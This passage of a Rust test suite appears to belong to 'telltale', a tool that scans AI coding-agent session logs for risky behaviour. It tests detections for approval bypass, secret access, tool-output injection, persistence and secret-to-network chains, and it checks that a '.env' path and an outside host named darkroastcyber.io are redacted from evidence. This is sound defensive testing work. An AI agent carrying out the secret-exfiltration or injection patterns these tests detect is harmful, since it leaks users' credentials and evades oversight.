            && event["session_id"] == "approval-bypass-user-text")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "approval-bypass-tool-result")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "approval-bypass-quoted-example")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "approval-bypass-cost-data")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "secret-access-auth-log")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "opencode-noise-approval-cost-data")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "opencode-noise-secret-auth-log")
    );
    assert!(
        events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "tool-injection-shape")
    );
    let tool_injection_shape_session = events
        .iter()
        .find(|event| event["session_id"] == "tool-injection-shape-session")
        .expect("tool injection shape session detection");
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    assert!(
        validator.is_valid(tool_injection_shape_session),
        "tool injection shape session event failed schema validation"
    );
    assert_eq!(tool_injection_shape_session["event_type"], "detection");
    assert_eq!(tool_injection_shape_session["severity"], "critical");
    assert!(
        tool_injection_shape_session["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "tool.injection.shape")
    );
    assert!(
        tool_injection_shape_session["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && item["hash"].is_string()
            })
    );
    assert!(events.iter().any(|event| event["event_type"] == "detection"
        && event["session_id"] == "install-persistence-chain"));
    assert!(
        events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "secret-network-chain")
    );
}

#[test]
fn scan_summary_reports_log_and_state_path_precedence() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("empty-root");
    fs::create_dir_all(&root).expect("empty root");
    let env_log = temp.path().join("env-events.jsonl");
    let env_state = temp.path().join("env-state.json");

    let profile = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--no-local-config",
            "--path-profile",
            "project",
            "--root",
        ])
        .arg(&root)
        .arg("--install-inventory-disabled")
        .env("TELLTALE_LOG_PATH", "")
        .env("TELLTALE_STATE_PATH", "")
        .output()
        .expect("run profile scan");
    assert!(profile.status.success());
    let profile_summary: Value = serde_json::from_slice(&profile.stdout).expect("summary json");
    assert_eq!(
        profile_summary["effective_configuration"]["paths"]["log"]["origin"],
        "path_profile"
    );
    assert_eq!(
        profile_summary["effective_configuration"]["paths"]["state"]["origin"],
        "path_profile"
    );
    assert_eq!(
        profile_summary["effective_configuration"]["paths"]["log"]["path_hash"],
        path_hash(Path::new("logs/telltale-events.jsonl"))
    );
    assert_eq!(
        profile_summary["effective_configuration"]["paths"]["state"]["path_hash"],
        path_hash(Path::new("state/telltale-state.json"))
    );

    let environment = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .arg("--install-inventory-disabled")
        .env("TELLTALE_LOG_PATH", &env_log)
        .env("TELLTALE_STATE_PATH", &env_state)
        .output()
        .expect("run environment scan");
    assert!(environment.status.success());
    let environment_summary: Value =
        serde_json::from_slice(&environment.stdout).expect("summary json");
    assert_eq!(
        environment_summary["effective_configuration"]["paths"]["log"]["origin"],
        "environment"
    );
    assert_eq!(
        environment_summary["effective_configuration"]["paths"]["state"]["origin"],
        "environment"
    );
    assert_eq!(
        environment_summary["effective_configuration"]["paths"]["log"]["path_hash"],
        path_hash(&env_log)
    );

    let cli_log = temp.path().join("cli-events.jsonl");
    let cli_state = temp.path().join("cli-state.json");
    let cli = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .args(["--log-path"])
        .arg(&cli_log)
        .args(["--state-path"])
        .arg(&cli_state)
        .arg("--install-inventory-disabled")
        .env("TELLTALE_LOG_PATH", &env_log)
        .env("TELLTALE_STATE_PATH", &env_state)
        .output()
        .expect("run cli scan");
    assert!(cli.status.success());
    let cli_summary: Value = serde_json::from_slice(&cli.stdout).expect("summary json");
    assert_eq!(
        cli_summary["effective_configuration"]["paths"]["log"]["origin"],
        "cli"
    );
    assert_eq!(
        cli_summary["effective_configuration"]["paths"]["state"]["origin"],
        "cli"
    );
    assert_eq!(
        cli_summary["effective_configuration"]["paths"]["state"]["path_hash"],
        path_hash(&cli_state)
    );
}

#[test]
fn scan_once_client_filter_limits_discovered_sources() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--client",
            "qwen",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let source_counts = summary["source_counts"]
        .as_object()
        .expect("source counts object");
    assert_eq!(source_counts.len(), 1);
    assert_eq!(source_counts["qwen.jsonl"], 2);
    assert_eq!(summary["source_discovery"]["returned_source_count"], 57);
    assert_eq!(summary["source_discovery"]["operational_source_count"], 2);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    assert!(!events.is_empty());
    assert!(
        events
            .iter()
            .all(|event| event["client"] == "scanner" || event["client"] == "qwen")
    );
}

#[test]
fn scan_once_accepts_repeated_client_filters() {
    let temp = tempdir().expect("tempdir");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--client",
            "codex",
            "--client",
            "qwen",
        ])
        .arg("--state-path")
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let source_counts = summary["source_counts"]
        .as_object()
        .expect("source counts object");
    assert_eq!(source_counts.len(), 4);
    assert_eq!(source_counts["codex.jsonl"], 40);
    assert_eq!(source_counts["codex.archived_jsonl"], 2);
    assert_eq!(source_counts["codex.headless_jsonl"], 2);
    assert_eq!(source_counts["qwen.jsonl"], 2);
}

#[test]
fn scan_and_watch_reject_unknown_and_retired_client_filters() {
    for rejected in ["unknown-agent", "gemini", "roocode", "kilocode"] {
        for args in [vec!["scan", "--once"], vec!["watch"]] {
            let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
                .args(&args)
                .args([
                    "--dry-run",
                    "--root",
                    "tests/fixtures/session_stores",
                    "--client",
                    rejected,
                ])
                .output()
                .expect("run telltale");

            assert!(!output.status.success(), "{args:?}: {rejected}");
            let stderr = String::from_utf8_lossy(&output.stderr);
            for expected in [
                format!("unsupported client '{rejected}'"),
                "codex".to_string(),
                "qwen".to_string(),
            ] {
                assert!(stderr.contains(&expected), "{args:?}: {stderr}");
            }
            for retired in ["gemini,", "roocode,", "kilocode,"] {
                assert!(!stderr.contains(retired), "{args:?}: {stderr}");
            }
        }
    }
}

#[test]
fn scan_once_max_sources_limits_discovered_sources() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--client",
            "qwen",
            "--max-sources",
            "1",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let source_counts = summary["source_counts"]
        .as_object()
        .expect("source counts object");
    assert_eq!(source_counts.len(), 1);
    assert_eq!(source_counts["qwen.jsonl"], 1);
    assert_eq!(summary["source_discovery"]["returned_source_count"], 57);
    assert_eq!(summary["source_discovery"]["operational_source_count"], 1);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let health = events
        .iter()
        .find(|event| event["event_type"] == "health")
        .expect("health event");
    assert_eq!(health["source_counts"]["qwen.jsonl"], 1);
}

#[test]
fn scan_once_max_sources_rejects_zero() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--max-sources",
            "0",
        ])
        .output()
        .expect("run telltale");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("--max-sources must be greater than 0"));
}

#[test]
fn scan_once_max_sources_is_deterministic() {
    let temp = tempdir().expect("tempdir");
    let state_path = temp.path().join("scan-state.json");
    let run_scan = || {
        Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--dry-run",
                "--root",
                "tests/fixtures/session_stores",
                "--client",
                "codex",
                "--max-sources",
                "3",
                "--state-path",
            ])
            .arg(&state_path)
            .output()
            .expect("run telltale")
    };

    let first = run_scan();
    let second = run_scan();
    assert!(
        first.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first.stderr)
    );
    assert!(
        second.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&second.stderr)
    );

    let first_summary: Value = serde_json::from_slice(&first.stdout).expect("first summary json");
    let second_summary: Value =
        serde_json::from_slice(&second.stdout).expect("second summary json");
    assert_eq!(
        first_summary["source_counts"],
        second_summary["source_counts"]
    );
    assert_eq!(
        first_summary["activity_count"],
        second_summary["activity_count"]
    );
    assert_eq!(
        first_summary["detection_count"],
        second_summary["detection_count"]
    );
}

#[test]
fn repeated_scans_suppress_duplicate_detections() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let run_scan = |extra: &[&str]| {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
                "tests/fixtures/session_stores",
                "--log-path",
            ])
            .arg(&log_path)
            .arg("--state-path")
            .arg(&state_path)
            .args(extra)
            .output()
            .expect("run telltale");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        serde_json::from_slice::<Value>(&output.stdout).expect("scan summary json")
    };
    let first_summary = run_scan(&[]);
    assert_eq!(first_summary["detection_count"], 30);
    assert_eq!(first_summary["emitted_count"], 31);
    assert_source_processing_accounting(&first_summary);
    assert_detection_flow_accounting(&first_summary, 30, 0);

    let second_summary = run_scan(&[]);
    assert_eq!(second_summary["detection_count"], 30);
    assert_eq!(second_summary["emitted_count"], 0);
    assert_source_processing_accounting(&second_summary);
    assert_detection_flow_accounting(&second_summary, 0, 30);
    assert_eq!(
        second_summary["detection_flow"]["matched_rule_id_count"],
        89
    );
    assert!(
        !second_summary["diagnostic_warnings"]
            .as_array()
            .expect("diagnostic warnings")
            .iter()
            .any(|warning| warning["code"] == "no_effective_detection_candidates")
    );

    let lines_before_backfill = fs::read_to_string(&log_path)
        .expect("log file before backfill")
        .lines()
        .count();
    let backfill_summary = run_scan(&["--dry-run", "--backfill"]);
    assert_eq!(backfill_summary["detection_count"], 30);
    assert_eq!(
        backfill_summary["detection_flow"]["effective_detection_candidate_count"],
        30
    );
    assert_eq!(
        backfill_summary["detection_flow"]["emitted_detection_count"],
        30
    );
    assert_eq!(
        backfill_summary["detection_flow"]["state_deduplicated_detection_count"],
        0
    );
    assert_eq!(
        fs::read_to_string(&log_path)
            .expect("log file after backfill")
            .lines()
            .count(),
        lines_before_backfill
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    assert_eq!(lines.lines().count(), 32);
}

#[test]
fn repeated_telltale_scans_share_state_and_deduplicate() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let run_scan = || {
        Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--emit-activity",
                "--install-inventory-disabled",
                "--no-local-config",
                "--root",
                "tests/fixtures/session_stores",
                "--log-path",
            ])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale")
    };

    let first = run_scan();
    assert!(
        first.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first.stderr)
    );
    let first_summary: Value = serde_json::from_slice(&first.stdout).expect("first summary");
    assert!(
        first_summary["detection_count"]
            .as_u64()
            .is_some_and(|count| count > 0)
    );
    assert!(
        first_summary["activity_count"]
            .as_u64()
            .is_some_and(|count| count > 0)
    );
    assert!(
        first_summary["emitted_count"]
            .as_u64()
            .is_some_and(|count| count > 0)
    );
    let first_log = fs::read_to_string(&log_path).expect("first log");
    let first_state: Value =
        serde_json::from_str(&fs::read_to_string(&state_path).expect("first state"))
            .expect("first state json");
    let first_events = first_log
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("first event json"))
        .collect::<Vec<_>>();
    assert!(
        first_events
            .iter()
            .any(|event| event["event_type"] == "detection")
    );
    assert!(
        first_events
            .iter()
            .any(|event| event["event_type"] == "activity")
    );

    let status = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["status", "--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale status");
    assert!(
        status.status.success(),
        "status stderr: {}",
        String::from_utf8_lossy(&status.stderr)
    );
    let status_summary: Value = serde_json::from_slice(&status.stdout).expect("status json");
    assert_eq!(status_summary["status"], "ok");
    assert_eq!(status_summary["log_path"], "[sensitive-path]");
    assert_eq!(status_summary["state_path"], "[sensitive-path]");
    assert!(
        status_summary["detection_count"]
            .as_u64()
            .is_some_and(|count| count > 0)
    );

    let second = run_scan();
    assert!(
        second.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&second.stderr)
    );
    let second_summary: Value = serde_json::from_slice(&second.stdout).expect("second summary");
    assert_eq!(
        second_summary["detection_count"],
        first_summary["detection_count"]
    );
    assert_eq!(
        second_summary["activity_count"],
        first_summary["activity_count"]
    );
    assert_eq!(second_summary["emitted_count"], 0);
    assert_eq!(
        fs::read_to_string(&log_path).expect("second log"),
        first_log,
        "telltale must not duplicate first-scan telemetry"
    );
    let second_state: Value =
        serde_json::from_str(&fs::read_to_string(&state_path).expect("second state"))
            .expect("second state json");
    for field in [
        "seen_source_fingerprints",
        "seen_detection_fingerprints",
        "baseline_source_contributions",
        "baseline_snapshots",
        "sqlite_ingestion_cursors",
        "install_inventory",
    ] {
        assert_eq!(
            second_state[field], first_state[field],
            "telltale must preserve dedup state field {field}"
        );
    }
}

#[test]
fn scan_once_persists_incremental_baseline_snapshots() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let run_scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--root",
                "tests/fixtures/benign_baselines",
                "--log-path",
            ])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        let summary: Value = serde_json::from_slice(&output.stdout).expect("scan summary");
        assert_eq!(
            summary["detection_flow"]["effective_detection_candidate_count"],
            0
        );
        let events = fs::read_to_string(&log_path).expect("benign events");
        assert!(events.lines().all(|line| {
            let event: Value = serde_json::from_str(line).expect("Event3 JSON");
            event["event_type"] != "detection"
        }));
    };

    run_scan();
    let state_after_first = fs::read_to_string(&state_path).expect("first state json");
    run_scan();
    let state_after_second = fs::read_to_string(&state_path).expect("second state json");
    let first_state: Value = serde_json::from_str(&state_after_first).expect("first state parses");
    let second_state: Value =
        serde_json::from_str(&state_after_second).expect("second state parses");
    assert_eq!(
        second_state["baseline_snapshots"], first_state["baseline_snapshots"],
        "repeat scans should not double-count baseline snapshots"
    );

    let snapshots = second_state["baseline_snapshots"]["snapshots"]
        .as_object()
        .expect("baseline snapshots");
    assert!(!snapshots.is_empty());

    let codex_records: u64 = snapshots
        .values()
        .filter(|snapshot| snapshot["key"]["client"] == "codex")
        .map(|snapshot| {
            snapshot["observations"]["records"]
                .as_u64()
                .unwrap_or_default()
        })
        .sum();
    assert!(codex_records > 0);
}

#[test]
fn scan_once_replaces_changed_source_baseline_contribution() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_store");
    let source_dir = root.join("codex/sessions");
    fs::create_dir_all(&source_dir).expect("source dir");
    let source_path = source_dir.join("append-only.jsonl");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let write_source = |tool_calls: &[(&str, &str)]| {
        let mut lines = vec![
            r#"{"type":"session_meta","session_id":"append-only","timestamp":"2026-05-17T10:00:00Z","payload":{"source":"cli","model_provider":"openai","agent_nickname":"codex-baseline-test","model":"o3"}}"#.to_string(),
            r#"{"type":"event_msg","timestamp":"2026-05-17T10:00:01Z","payload":{"type":"user_message","message":"Inspect the project files."}}"#.to_string(),
        ];
        for (index, (call_id, command)) in tool_calls.iter().enumerate() {
            lines.push(format!(
                r#"{{"type":"event_msg","timestamp":"2026-05-17T10:00:0{}Z","payload":{{"type":"tool_call","name":"shell","call_id":"{}","arguments":{{"command":"{}"}}}}}}"#,
                index + 2,
                call_id,
                command
            ));
        }
        fs::write(&source_path, format!("{}\n", lines.join("\n"))).expect("write source");
    };

    let run_scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args(["--client", "codex", "--log-path"])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    };

    write_source(&[("call-one", "ls src")]);
    run_scan();
    write_source(&[
        ("call-one", "ls src"),
        (
            "call-two",
            "curl https://internal.example.test/docs && cargo test --quiet",
        ),
    ]);
    run_scan();

    let state: Value = serde_json::from_str(&fs::read_to_string(&state_path).expect("state json"))
        .expect("state parses");
    let snapshot = state["baseline_snapshots"]["snapshots"]
        .as_object()
        .expect("snapshots")
        .values()
        .find(|snapshot| snapshot["key"]["client"] == "codex")
        .expect("codex snapshot");

    assert_eq!(snapshot["observations"]["tool_calls"], 2);
    assert_eq!(snapshot["tool_call_counts"]["shell"], 2);
    let state_text = fs::read_to_string(&state_path).expect("state text");
    assert!(
        !state_text.contains("internal.example.test"),
        "persisted baseline state should not contain raw network host labels"
    );
    assert!(
        state_text.contains("sha256:"),
        "persisted baseline state should contain deterministic host hashes"
    );
}

#[test]
fn scan_once_persists_distinct_source_contributions_for_same_bucket() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_store");
    let source_dir = root.join("codex/sessions/2026/05");
    fs::create_dir_all(&source_dir).expect("source dir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    for (name, command) in [
        ("session-a.jsonl", "ls src"),
        ("session-b.jsonl", "git status --short"),
    ] {
        let event = serde_json::json!({
            "type": "event_msg",
            "timestamp": "2026-05-17T10:00:02Z",
            "payload": {
                "type": "tool_call",
                "name": "shell",
                "call_id": format!("call-{name}"),
                "arguments": {"command": command}
            }
        });
        fs::write(
            source_dir.join(name),
            format!(
                "{}\n{}\n{}\n",
                serde_json::json!({"type":"session_meta","session_id":name,"timestamp":"2026-05-17T10:00:00Z","payload":{"source":"cli","model_provider":"openai","agent_nickname":"codex-baseline-test","model":"o3"}}),
                r#"{"type":"event_msg","timestamp":"2026-05-17T10:00:01Z","payload":{"type":"user_message","message":"Inspect the project files."}}"#,
                event
            ),
        )
        .expect("write source");
    }

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--client", "codex", "--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let state: Value = serde_json::from_str(&fs::read_to_string(&state_path).expect("state json"))
        .expect("state parses");
    let contributions = state["baseline_source_contributions"]
        .as_object()
        .expect("contributions");
    assert_eq!(contributions.len(), 2);
}

#[test]
fn scan_once_rebuild_baselines_reparses_unchanged_sources_without_reemitting_detections() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_store");
    let source_dir = root.join("codex/sessions/2026/05");
    fs::create_dir_all(&source_dir).expect("source dir");
    let source_path = source_dir.join("session-a.jsonl");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    fs::write(
        &source_path,
        concat!(
            r#"{"type":"session_meta","session_id":"session-a","timestamp":"2026-05-17T10:00:00Z","payload":{"source":"cli","model_provider":"openai","agent_nickname":"codex-baseline-test","model":"o3"}}"#,
            "\n",
            r#"{"type":"event_msg","timestamp":"2026-05-17T10:00:01Z","payload":{"type":"user_message","message":"Inspect the project files."}}"#,
            "\n",
            r#"{"type":"event_msg","timestamp":"2026-05-17T10:00:02Z","payload":{"type":"tool_call","name":"shell","call_id":"call-one","arguments":{"command":"ls src"}}}"#,
            "\n"
        ),
    )
    .expect("write source");

    let run_scan = |rebuild_baselines: bool| {
        let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
        command
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args([
                "--client",
                "codex",
                "--emit-activity",
                "--install-inventory-disabled",
                "--log-path",
            ])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path);
        if rebuild_baselines {
            command.arg("--rebuild-baselines");
        }
        command.output().expect("run telltale")
    };

    let first = run_scan(false);
    assert!(
        first.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first.stderr)
    );
    let first_summary: Value = serde_json::from_slice(&first.stdout).expect("summary json");
    assert_eq!(first_summary["activity_count"], 1);
    assert_eq!(first_summary["emitted_count"], 1);

    let mut state: Value =
        serde_json::from_str(&fs::read_to_string(&state_path).expect("state json"))
            .expect("state parses");
    state["baseline_snapshots"]["snapshots"] = serde_json::json!({});
    state["baseline_source_contributions"] = serde_json::json!({});
    state["source_observations"] = serde_json::json!({});
    fs::write(
        &state_path,
        serde_json::to_string_pretty(&state).expect("serialize state"),
    )
    .expect("rewrite state");

    let rebuilt = run_scan(true);
    assert!(
        rebuilt.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&rebuilt.stderr)
    );
    let rebuilt_summary: Value = serde_json::from_slice(&rebuilt.stdout).expect("summary json");
    assert_eq!(rebuilt_summary["activity_count"], 1);
    assert_eq!(rebuilt_summary["emitted_count"], 0);

    let rebuilt_state: Value =
        serde_json::from_str(&fs::read_to_string(&state_path).expect("rebuilt state json"))
            .expect("rebuilt state parses");
    assert!(
        rebuilt_state["baseline_snapshots"]["snapshots"]
            .as_object()
            .is_some_and(|snapshots| !snapshots.is_empty())
    );
    assert!(
        rebuilt_state["baseline_source_contributions"]
            .as_object()
            .is_some_and(|contributions| contributions.len() == 1)
    );
    assert!(
        rebuilt_state["source_observations"]
            .as_object()
            .is_some_and(|observations| observations.len() == 1)
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    assert_eq!(lines.lines().count(), 3);
}

#[test]
fn scan_once_can_emit_activity_events() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert!(summary["activity_count"].as_u64().unwrap_or_default() > 0);
    assert_eq!(summary["detection_count"], 30);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    assert!(events.iter().any(|event| {
        event["event_type"] == "activity"
            && event["client"] == "opencode"
            && (event["severity"] == "informational" || event["severity"] == "low")
    }));
}

#[cfg(target_os = "linux")]
#[test]
fn scan_once_persists_opencode_cursor_and_replays_recovery_after_failures() {
    let temp = tempdir().expect("tempdir");
    let secret = "SYNTHETIC-RECOVERY-SECRET";
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).unwrap();
    let validator = validator_for(&schema).unwrap();
    let rules_path = temp.path().join("recovery-rule.yaml");
    fs::write(
        &rules_path,
        r#"
version: 1
description: Synthetic page-two recovery test.
defaults: { case_insensitive: false, enabled: true }
modifiers: []
rules:
  - id: synthetic.recovery.page_two
    title: Synthetic recovery marker
    tags: [synthetic]
    category: synthetic
    severity: high
    score: 70
    detection:
      selection:
        assistant_context: 'synthetic-page-two-security-marker'
      condition: selection
    explanation: Synthetic persisted recovery evidence.
"#,
    )
    .unwrap();
    let root = temp.path().join("home");
    let opencode_dir = root.join(".local/share/opencode");
    fs::create_dir_all(&opencode_dir).expect("opencode dir");
    let db_path = opencode_dir.join("opencode.db");
    let conn = Connection::open(&db_path).expect("open db");
    conn.execute_batch(
        "create table message (
            id text primary key,
            session_id text not null,
            time_created integer not null,
            time_updated integer not null,
            data text not null
        );
        create table part (
            id text primary key,
            message_id text not null,
            session_id text not null,
            time_created integer not null,
            time_updated integer not null,
            data text not null
        );",
    )
    .expect("schema");
    conn.execute(
        "insert into message (id, session_id, time_created, time_updated, data)
         values (?1, ?2, ?3, ?4, ?5)",
        (
            "message-a",
            "session-a",
            1_775_000_000_000_i64,
            1_775_000_000_000_i64,
            serde_json::json!({"role": "assistant"}).to_string(),
        ),
    )
    .expect("insert message");
    conn.execute(
        "insert into part (id, message_id, session_id, time_created, time_updated, data)
         values (?1, ?2, ?3, ?4, ?5, ?6)",
        (
            "part-a",
            "message-a",
            "session-a",
            1_775_000_001_000_i64,
            1_775_000_001_000_i64,
            serde_json::json!({"type": "text", "text": format!("benign assistant response api_key={secret}")}).to_string(),
        ),
    )
    .expect("insert part");
    drop(conn);

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .env_clear()
            .env("HOME", &root)
            .env("XDG_CONFIG_HOME", root.join(".config"))
            .env("XDG_DATA_HOME", root.join(".local/share"))
            .env("XDG_STATE_HOME", root.join(".local/state"))
            .env("XDG_CACHE_HOME", root.join(".cache"))
            .current_dir(temp.path())
            .args([
                "scan",
                "--once",
                "--emit-activity",
                "--no-local-config",
                "--install-inventory-disabled",
                "--client",
                "opencode",
                "--root",
            ])
            .arg(&root)
            .args(["--no-default-rules", "--rules"])
            .arg(&rules_path)
            .args(["--log-path"])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale");
        for bytes in [&output.stdout, &output.stderr] {
            assert!(!String::from_utf8_lossy(bytes).contains(secret));
        }
        if state_path.is_file() {
            assert!(!fs::read_to_string(&state_path).unwrap().contains(secret));
        }
        if log_path.is_file() {
            let persisted = fs::read_to_string(&log_path).unwrap();
            assert!(!persisted.contains(secret));
            for line in persisted.lines() {
                let event: Value = serde_json::from_str(line).unwrap();
                assert_eq!(event["schema_version"], "3.0");
                assert!(validator.is_valid(&event), "invalid Event3: {event}");
            }
        }
        output
    };
    let output = scan();

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["source_counts"]["opencode.sqlite"], 1);

    let state: Value = serde_json::from_str(&fs::read_to_string(&state_path).expect("state file"))
        .expect("state json");
    let cursors = state["sqlite_ingestion_cursors"]
        .as_object()
        .expect("sqlite cursors");
    assert_eq!(cursors.len(), 1);
    let cursor = cursors.values().next().expect("cursor");
    assert_eq!(cursor["table"], "part");
    assert_eq!(cursor["last_time_updated"], 1_775_000_001_000_i64);
    // SQLite acquisition is explicitly partial-source coverage, so it must not
    // install complete-source baseline contributions, even on successful scans.
    assert!(
